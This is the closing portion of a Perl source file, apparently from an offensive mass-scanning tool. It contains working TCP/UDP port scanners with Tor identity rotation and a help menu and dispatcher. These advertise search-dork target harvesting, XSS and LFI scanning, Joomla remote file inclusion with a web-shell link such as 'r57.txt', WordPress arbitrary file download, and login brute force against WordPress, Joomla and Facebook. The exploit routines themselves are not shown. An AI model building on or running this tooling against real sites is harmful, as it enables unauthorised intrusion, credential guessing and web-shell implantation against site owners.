  print "\033[0;37m$mmd5\n";
  print "\033[1;37m    MD5:    ";
  print '\033[0;32m';
  print Digest::MD5->md5_hex("$mmd5");
  print "\n";
  print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ENCODE BASE 64
sub mencode64 {
  scanDetail();
  scanTitleBgn();
  print "\033[1;37mENCODE BASE64";
  scanTitleEnd();
  print "\033[1;37m    STRING: ";
  print "\033[0;37m$mencode64\n";
  my $sss=encode_base64($mencode64);
  print "\033[1;37m    ENCODE: ";
  print "\033[0;32m$sss\n";
  print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DECODE BASE 64
sub mdecode64 {
  scanDetail();
  scanTitleBgn();
  print "\033[1;37mDECODE BASE64";
  scanTitleEnd();
  print "\033[1;37m    STRING: ";
  print "\033[0;37m$mdecode64\n";
  my $rrr=decode_base64($mdecode64);
  print "\033[1;37m    DECODE: ";
  print "\033[0;32m$rrr\n";
  print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD PORTS SCAN INFO
sub resumeportscan {
  if (defined $mports) {
    print "\033[1;37m    INFO:   ";
    if (defined $mbasic) {
	  print "Basic Scan ";
    }
    if (defined $mcomplete) {
      print "Complete Scan ";
    }
    if (defined $muser) {
      print "Select Scan ";
    }
	my $muser=$muser;
	my $mcomplete=$mcomplete;
	if (defined $udp) {
	  print "UDP ";
	}
	if (defined $tcp) {
	  print "TCP ";
	}
    if (defined $all) {
	  print "TCP + UDP";
	}
    if ((defined $mstart) && (defined $mend)) {
      print "[$mstart To $mend] ";
    }
    print "\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BASIC PORTS SCAN
sub basic {
  headerScan();
  print "\033[1;37mPORTS BASIC";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkIp($URL);
	print "\033[1;33m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$URL \n";
	resumeportscan();
	$URL=$URL;
    my $type=$_[0];
    my $closed1=0;
    my @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach my $port1(@PORTS){
	  if (defined $random) {newIdentity();}
      my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
	  if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type  ";
	  print "\033[1;37mPORT:  ";
      print "$port1  ";
	  print "\033[1;37mINFO:  ";
      if ($closed1==0){
	    if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
	    print "\033[0;31mClosed!\n";
	  }
      my $closed1=0;
    }
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BASIC2 PORTS SCAN
sub basic2 {
  headerScan();
  print "\033[1;37mPORTS BASIC";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkIp($URL);
	print "\033[1;33m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$URL \n";
	resumeportscan();
	$URL=$URL;
    my $closed2=0;
    my $closed3=0;
    my @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach my $port2(@PORTS){
	  if (defined $random) {newIdentity();}
       my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
	   if (defined $socket) {
         close $socket;
         my $closed2=0;
	    }
        my $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
		if (defined $socket2) {
          close $socket2;
	    }
 	    print "\033[1;37m    TYPE:  ";
        print "tcp  ";
	    print "\033[1;37mPORT:  ";
        print "$port2  ";
	    print "\033[1;37mINFO:  ";               
	    if ($closed2==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed! \n";
      }	  
      if ($closed3==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed!\n";
      }
	  my $closed2=0;
      my $closed3=0;
    }
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COMPLETE PORTS SCAN
sub complete {
  headerScan();
  print "\033[1;37mPORTS COMPLETE";
  scanTitleEnd();
  my $type2=$_[0];
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	$URL = checkIp($URL);
	my $closed3=0;
    my $port3=1;
	print "\033[1;33m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
    print "\033[1;37m    TARGET: ";
	print "\033[0;35m$URL \n";
	resumeportscan();
    while ($port3<=65535){
	  if (defined $random) {newIdentity();}
      my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
	  if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type2  ";
	  print "\033[1;37mPORT:  ";
      print "$port3  ";
	  print "\033[1;37mINFO:  ";
      if ($closed3==0){
	  if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
	    print "\033[0;31mClosed!\n";
	  }
    }
	$closed3=0;
    $port3++;
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COMPLETE2 PORTS SCAN
sub complete2 {
  headerScan();
  print "\033[1;37mPORTS COMPLETE";
  scanTitleEnd();
  my $count=0;
  my $closed4=0;
  my $closed5=0;
  my $port4=1;
  while ($port4<=65535){
  open (TEXT, $Bin.'/aTsearch.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkIp($URL);
	  print "\033[1;33m    ";
	  timer();
	  print "[$count/";
	  my $file=$Bin."/aTsearch.txt";
	countLists($file);
	  print "\033[1;33m]\n";
	  print "\033[1;37m    TARGET: ";
	  print "\033[0;35m$URL \n";
	  resumeportscan();
	  if (defined $random) {newIdentity();}
      my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
	  if (defined $socket) {
        close $socket;
	  }
	  my $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
	  if (defined $socket2) {
        close $socket2;
	  }
 	  print "\033[1;37m    TYPE:  ";
      print "tcp  ";
	  print "\033[1;37mPORT:  ";
      print "$port4  ";
      print "\033[1;37mINFO:  ";
      if ($closed4==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed!\n";
      }
      
      if ($closed5==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed!\n";
      }
    }
    my $closed4=0;
    my $closed5=0;
    $port4++;
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE PORTS SCAN
sub subuser {
  if ((!defined $mstart) || (!defined $mend)) {

    print "\033[0;33m[..][:] Type Start Of The Port : ";
        $mstart=<STDIN>;
    chomp($mstart);
    print "\033[0;33m[..][:] Type End Of The Port : ";
        $mend=<STDIN>;
    chomp($mend);
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE PORTS SCAN
sub user {
  headerScan();
  print "\033[1;37mPORTS SELECTIVE";
  scanTitleEnd();
  if (defined $muser){
    my $type3=$muser;
  }else{
    my $type3=$_[0];
  }
  my $count=0;
  my $type3=$_[0];
  my $closed6=0;
  while ($mstart<=$mend){
  open (TEXT, $Bin.'/aTsearch.txt');
    while (my $URL = <TEXT>) {
      $count++;
	  chomp $URL;
	  $URL = checkIp($URL);
	  print "\033[1;33m    ";
	  timer();
	  print "[$count/";
	  my $file=$Bin."/aTsearch.txt";
	countLists($file);
	  print "\033[1;33m]\n";
	  print "\033[1;37m    [!] TARGET: ";
	  print "\033[0;35m$URL \n";
	  resumeportscan();
	  if (defined $random) {newIdentity();}
      my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
      if (defined $socket) {
        close $socket;
	  }
	  print "\033[1;37m    TYPE:  ";
      print "$type3  ";
	  print "\033[1;37mPORT:  ";
      print "$mstart  ";
	  print "\033[1;37mINFO:  ";
      if ($closed6==0){
	  if (defined $beep) {print chr(7);}
	    print "\033[0;32mOpen!\n";
	  }else{
		print "\033[0;31mClosed!\n";
      }
    }
    my $closed6=0;
    $mstart++;
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SELECTIVE2 PORTS SCAN
sub user2 {
  headerScan();
  print "\033[1;37mPORTS SELECTIVE";
  scanTitleEnd();
  my $count=0;
  my $closed7=0;
  my $closed8=0;
  my $port4=1;
  while ($mstart<=$mend){
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
	 chomp $URL;
	 $URL = checkIp($URL);
	 $count++;
  	 print "\033[1;33m    ";
	 timer();
	 print "[$count/";
	 my $file=$Bin."/aTsearch.txt";
	countLists($file);
	 print "\033[1;33m]\n";
	 print "\033[1;37m    TARGET: ";
	 print "\033[0;35m$URL \n";
	 resumeportscan();
	 if (defined $random) {newIdentity();}
     my $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
	 if (defined $socket) {
       close $socket;
	 }
     my $socket2 = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
	 if (defined $socket2) {
       close $socket2;
	 }
     print "\033[1;37m    TYPE:  ";
     print "tcp  ";
	 print "\033[1;37mPORT:  ";
     print "$mstart  ";
	 print "\033[1;37mINFO:  ";
     print "\033[1;37mPORT:  ";
     print "$port4  ";    
     if ($closed7==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed!\n";
      }
      if ($closed8==0){
        if (defined $beep) {print chr(7);}
		print "\033[0;32mOpen!\n";
      }else{
        print "\033[0;31mClosed!\n";
      }
    }
    my $closed7=0;
    my $closed8=0;
    $mstart++;
    print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
  }
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## HELP MENU
sub help {
  print "\033[1;37m[:]-----------------------------------------------------------------------[:]\n\n";
  print "\033[1;33m";
  print "[:] HELP:: \n";
  print "  \033[0;37m[ ] --------------------------------------------------------------------\n";
  print "\033[0;37m";
  print "   --tor         | Set tor proxy [EX: socks://localhost:9050]\n";
  print "   --proxy       | Set proxy [EX: --proxy http://12.45.44.2:8080]\n";
  print "                 | Set proxy list [EX: --proxy list.txt]\n";
  print "   --random      | Renew tor identity for every link scaned.\n";
  print "   --dork        | Dork to search [Ex: house,cars,hotel] \n";
  print "   --level       | Scan level (+- Number of page results to scan) \n";
  print "   --time        | set browser time out. \n";
  print "   --valid       | Text for validate results \n";
  print "   --ifinurl     | Text to validate target url \n";
  print "   --isup        | Check http status 200. \n";
  print "   --unique      | Get targets with exact dork matching.\n";
  print "   --exp         | Exploit\n";
  print "   -t            | Target [http://site.com]\n";
  print "   -p            | Set xss test parameter \n";
  print "   -m            | Set engine motors. default bing [EX: -m google | bing | ask | all] \n"; 
  print "   --xss         | Xss scan \n";
  print "   --lfi         | Local file inclusion \n";
  print "   --joomrfi     | Scan for joomla local file inclusion\n";
  print "   --shell       | Shell link [Ex: http://www.site.com/shell.txt] \n";
  print "   --wpafd       | Scan wordpress sites for arbitery file download\n";
  print "   --admin       | Get site admin page \n";
  print "   --shost       | Get site subdomains \n";
  print "   --ports       | Scan server ports \n";
  print "   --start       | Start scan port \n";
  print "   --end         | End scan port \n";
  print "   --complete    | Complete mode \n";
  print "   --tcp         | TCP port \n";
  print "   --udp         | UDP port \n";
  print "   --all         | TCP + UDP ports \n";
  print "   --basic       | Basic mode \n";
  print "   --select      | Select mode you can set rang of ports \n";
  print "   --sites       | Sites in the server \n";
  print "   --wp          | Wordpress sites in the server\n";
  print "   --joom        | Joomla sites in the server\n";
  print "   --upload      | Get sites with upload files in the server  \n";
  print "   --zip         | Get sites with zip files in the server \n";
  print "   --md5         | Convert to md5 \n";
  print "   --encode64    | Encode base64 string \n";
  print "   --decode64    | decode base64 string \n";
  print "   --dom         | Domain name [Ex: site.com] \n";
  print "   --TARGET      | Will be replaced by target in command \n";
  print "   --command     | Extern Command to execute\n";
  print "   --replace     | String to replace \n";
  print "   --with        | String to replace with \n";
  print "   --email       | Get emails \n";
  print "   --save        | Save scan.\n";
  print "   --rang        | Set ip range [Ex: --rang 124.12.10.144-22.36.14.152]\n";
  print "   --wpbf        | Wordpress Login Brute Force\n";
  print "   --joombf      | Joomla Login Brute Force\n";
  print "   --user        | Set Username Login FB/WP/JOOM Brute Force\n";
  print "   --pass        | Set Password List Login FB/WP/JOOM Brute Force\n";
  print "   --nobanner    | Hide tool banner\n";
  print "   --beep        | Produce beep sount if positive scan found.\n";
  print "   --noinfo      | Jump extra results info.\n";
  print "   --update      | Check and update tool\n\n";

  print "\033[1;33m[..] EXAMPLES: \n\n";
  print "\033[1;37m  Tor: \n";
  print "  ......................\n";
  print "\033[0;37m    Tor --tor <proxy>\n";
  print "\033[0;37m    Proxy --proxy <proxy> | --proxy <list.txt>\n";
  print "\033[0;37m    Random --random\n\n";

  print "\033[1;37m  Search engine: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Search: --dork <dork> --level <level> \n";
  print "    Set engine: --dork <dork> --level <level> [EX: -m google | bing | ask | all]\n";  
  print "    Search with many dorks: --dork <dork1,dork2,dork3> --level <level> \n";
  print "    Search + get emails: --dork <dorks.txt> --level <level> --email \n";
  print "    Search + get site emails: --dork <site:site.com> --level <level> --email \n";
  print "    Search + get ip+server: --dork <dorks.txt> --level <level> \n";
  print "    Search + set save file: --dork <dorks.txt> --level <level> --save\n";
  print "    Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";

  print "\033[1;37m  Subscan from Serach Engine: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Exploitation: --dork <dork> --level <10> [--xss | --lfi | --wp |...]\n";
  print "    Server Exploitation: -t <ip> --level <10> [--xss | --lfi | --wp |...]\n";
  print "    Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss | --lfi |...]\n\n";
  
  print "\033[1;37m  Validation: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Search + Url Validation: --dork <dork> --level <10> --ifinurl <string>\n";
  print "    Search + dork Validation: --dork <dork> --level <10> --unique\n";
  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp [--isup | --valid] <string>\n";
  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp [--isup | --valid] <string>\n";
  print "    Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> [--isup | --valid] <string>\n\n";
  print "\033[1;37m  Use List / Target: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    -t <target | targets.txt> --exp [--isup | --valid] <string>\n";
  print "    -t <target | targets.txt> [--xss | --lfi | --wp |...]\n\n";
  print "\033[1;37m  Server: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Get Server sites: -t <ip> --level <value> --sites\n";
  print "    Get Server wordpress sites: -t <ip> --level <value> --wp \n";
  print "    Get Server joomla sites: -t <ip> --level <value> --joom \n";
  print "    Get Server upload sites: -t <ip> --level <value> --upload \n";
  print "    Get Server zip sites files: -t <ip> --level <value> --zip \n";
  print "    WP Arbitry File Download: -t <ip> --level <value> --wpafd \n";
  print "    Joomla RFI: -t <ip> --level <10> --joomfri --shell <shell link>\n";
  print "    Scan basic tcp (quick): -t <ip> --ports --basic --tcp\n";
  print "    Scan basic udp basic (quick): -t <ip> --ports --basic --udp\n";
  print "    Scan basic udp+tcp: -t <ip> --ports --basic --all\n";
  print "    Scan complete tcp: -t <ip> --ports --complete --tcp\n";
  print "    Scan complete udp: -t <ip> --ports --complete --udp\n";
  print "    Scan complete udp+tcp: -t <ip> --ports --complete --all\n";
  print "    Scan range tcp: -t <ip> --ports --select  --tcp --start <value> --end <value>\n";
  print "    Scan range udp: -t <ip> --ports --select  --udp --start <value> --end <value>\n";
  print "    Scan range udp + tcp: -t <ip> --ports --select  --all --start <value> --end <value>\n\n";
  print "\033[1;37m  Encode / Decode: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    Generate MD5: --md5 <string> \n";
  print "    Encode base64: --encode64 <string>  \n";
  print "    Decode base64: --decode64 <string> \n\n";
  
  print "\033[1;37m  External Command: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "   --dork <dork | dorks.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   -t <target | targets.txt> --command \"curl -v --TARGET\" \n\n";
  
  print "\033[1;37m  Multiple Scan: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    --dork <dork> --level <10> --xss --lfi --wp ..\n";
  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss | --lfi | --wp |...]\n";
  print "    -t <ip> --level <10> [--xss | --lfi | --wp |...]\n";
  print "    -t <targets> [--xss | --lfi | --wp |...]\n\n";
  
  print "\033[1;37m  Brute Force WP/JOOM Login: \n";
  print "  ......................\n";
  print "\033[0;37m";
  print "    --dork <dork> --level <10> [--wpbf | --joombf] --user <user> --pass password.txt \n\n";
  
  print "\033[1;37m  Check Tool Version and Update: \n";
  print "  ......................\n";
  print "\033[0;37m    --update\n"; 
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  
  print "\033[1;37m  About Tool: \n";
  print "  ......................\n";
  print "\033[0;37m    --about | -?\n"; 
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## PRINT DESCLAIMER
if ((!defined $dork) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkVersion) && (!defined $mdecode64)) {
  print "\n";
  advise();
}
desclaimer();
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXPLOIT LIST
if (defined $exploit) {
  my $checkDorkList = $Bin."/aTexploits.txt";
  if (-e $checkDorkList){ unlink $checkDorkList};
  if (substr($exploit, -4) eq '.txt') {
	use File::Copy qw(copy);
	copy $exploit, $Bin.'/aTexploits.txt';
  }else{
    if ($exploit =~ m/,/) {
      $exploit =~ s/,/ /g;
    }elsif ($exploit =~ m/ /) {
      $exploit =~ s/ /+/g;
    }
    my @exploits = split / /, $exploit;
    foreach my $exploit (@exploits) {
      open (FILE, '>'.$Bin.'/aTexploits.txt');
      print FILE "$exploit\n";
      close (FILE);
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK TARGET PROTOCOL
if ((defined $Target)&&(!defined $mlevel)) {
  if ((!-e $Target) && ($Target !~ /https?:\/\//) && (!defined $mports)) {
    finInfoMenu();
	print "\033[0;31m[!] Uppss.. Cannot process scan!\n";
    print "\033[0;33m[!] Possible solutions:\n"; 
	print "\033[0;33m    - Target must have protocol [http[s]://].\n";
	print "\033[0;33m    - Target file extension must be [.txt].\n";
	print "\033[0;33m    - Target file must exist.\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK ARGV IF IS TEXT FILE
my $lst;
if (defined $Target and $Target!~ /https?:\/\//) {$lst=$Target;}
if (defined $password) {$lst=$password;}
if (defined $lst) {
  if ($lst =~ /([a-zA-Z0-9\-\_]\.)[a-zA-Z]/){
    if (!-e $lst) {
      finInfoMenu();
      print "\033[0;31m[!] No $lst found!\n";
	  exit();
    }
    if (substr($lst, -4) ne '.txt') {
      finInfoMenu();
      print "\033[0;31m[!] Conflict!! Please change $lst file ext to [.txt]!\n";
	  exit();
	}
  }
}

if (defined $dork and substr($dork, -4) eq '.txt') {
  if (!-e $dork) {
    finInfoMenu();
    print "\033[0;31m[!] No $dork found!\n";
    exit();
  }
}
if (defined $exploit and substr($exploit, -4) eq '.txt') {
  if (!-e $exploit) {
    finInfoMenu();
    print "\033[0;31m[!] No $exploit found!\n";
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
if (defined $exploit) {
  if ((!defined $xss) && (!defined $lfi) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {
    finInfoMenu();  
    print "\033[0;31m[!] You have to set a scan for exploited targets![xss|lfi|...]\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
if ((defined $Target) || (defined $rangip)) {
  if ((!defined $xss) && (!defined $exploit) && (!defined $lfi) && (!defined $ifinurl) && (!defined $unique) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $eMails) && (!defined $mlevel) && (!defined $WpBf) && (!defined $joomBf)) {
  advise();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
if ((defined $replace) && (defined $with)) {
  if ((!defined $xss) && (!defined $exploit) && (!defined $lfi) && (!defined $ifinurl) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {
  advise();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS VERIFICATION (LEVEL)
if (defined $msites){
  if (!defined $mlevel) {
    finInfoMenu();
    print "\033[0;31m[!] To scan server sites You have to set level [Ex: --level 10]!\n";
	exit();
  }
}
if ((defined $dork) && (!defined $mlevel)) {
  finInfoMenu();
  print "\033[0;31m[!] You have to set scan level [Ex: --level 10]\n";
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## MORE ARGUMENTS PROCESS VERIFICATION
if ((defined $dork) || (defined $Target) || (defined $rangip)) {
  if (defined $JoomRfi) {
	if (!defined $shell) {
      finInfoMenu();      
      print "\033[0;31m[!] You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]\n";
	  exit();
    }
  }
  if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
    finInfoMenu();   
    print "\033[0;31m[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
	exit();
  }
  if (((defined $WpBf) || (defined $joomBf)) && ((!defined $username) || (!defined $password))){
    finInfoMenu();   
    print "\033[0;31m[!] Invalid option! [Ex: --wpbf/joomBf --user <value> --pass <pass.txt>]\n";
	exit();
  }
}
if (!defined $dork) {
  if ((defined $unique) || (defined $ifinurl)) {
    finInfoMenu();   
    print "\033[0;31m[!] Invalid option! --ifinurl or --unique needs dork search!\n";
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS PROCESS (PORTS)
if (defined $mports) {
  if ((!defined $mbasic) && (!defined $mcomplete) && (!defined $muser)) {
    finInfoMenu();   
    print "\033[0;31m[!] Invalid option! [Ex: t- <ip> --ports --basic --tcp]\n";
    exit();
  }
  if ((defined $mbasic) || (defined $mcomplete) || (defined $all)) {
    if ((!defined $tcp) && (!defined $udp) && (!defined $all)) {
      finInfoMenu();   
      print "\033[0;31m[!] Invalid option! [Ex: t- <ip> --ports --basic --tcp]\n";
      exit();
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ARGUMENTS PROCESS (PROXY)
if (((!defined $proxy) && (!defined $tor)) || (defined $proxy and substr($proxy, -4) ne '.txt')){
  if (defined $random) {
    finInfoMenu();      
    print "\033[0;31m[!] --random need proxy or tor use!\n";
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK MOTORS ARGUMENTS
if (defined $motor) {
  if ($motor !~ /bing|google|ask|all/) {
    finInfoMenu();      
    print "\033[0;31m[!] Just you can use Bing / Google / Ask search! Soon more engines..\n";
    exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN ARGUMENTS 
if (defined $mlevel) {
  if ($mlevel < 10) {
    finInfoMenu();   
    print "\033[0;31m[!] Min level is 10 [--level >=10]\n";
    exit();
  }
  if ((defined $dork) || (defined $Target) || (defined $rangip)){
    submsearch();
	exit();
  }
}else{
  if ((defined $Target)  || (defined $rangip)){
    scanDetail();
    if (defined $misup) {misup();}
    if (defined $validText) { validation();}
    if (defined $xss) { xss();}
	if (defined $lfi) { lfi();}
	if (defined $JoomRfi) { JoomRfi();}
	if (defined $WpAfd) { WpAfd();}
	if (defined $adminPage) { adminPage();}
	if (defined $subdomain) { subdomain();}
	if (defined $mupload) { uploadSites();}
	if (defined $mzip) { zipSites();}
	if (defined $eMails) { eMails();}
	if (defined $mports) { 
      if (defined $mbasic) {
        if (defined $tcp) { basic('tcp'); }
        if (defined $udp) { basic('udp'); }
        if (defined $all) { basic2();}
	  }
      if (defined $mcomplete) {
        if (defined $tcp) { complete('tcp');}
        if (defined $udp) { complete('udp');}
        if (defined $all) { complete2(); }
	  }
      if (defined $muser) {
	    if ((!defined $mstart) && (!defined $mend)) {
          print "\033[0;33m[!] Set a port range! [Ex: --start 21 --end 81]\n";          
	      exit();
	    }else{
          if (defined $tcp) { user('tcp');}
          if (defined $udp) { user('udp');}
          if (defined $all) { user2(); }
		}
	  }
	}
	if (defined $WpBf) { BFmwpsites();}
	if (defined $joomBf) { BFmjoomsites();}
    if (defined $command) {mcommand();}
	exit();
  }
}
if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
  use Digest::MD5;
  use MIME::Base64;
  if (defined $mmd5) { mmd5();exit();
  }elsif (defined $mencode64) { mencode64();exit();
  }elsif (defined $mdecode64) { mdecode64();exit();}
}
if (defined $checkVersion) { checkVersion(); exit();}
if (defined $help) { help(); exit();}
############################################################################################################################################################################################
############################################################################################################################################################################################
## Copy@right Alisam Technology Team
## 
############################################################################################################################################################################################
############################################################################################################################################################################################
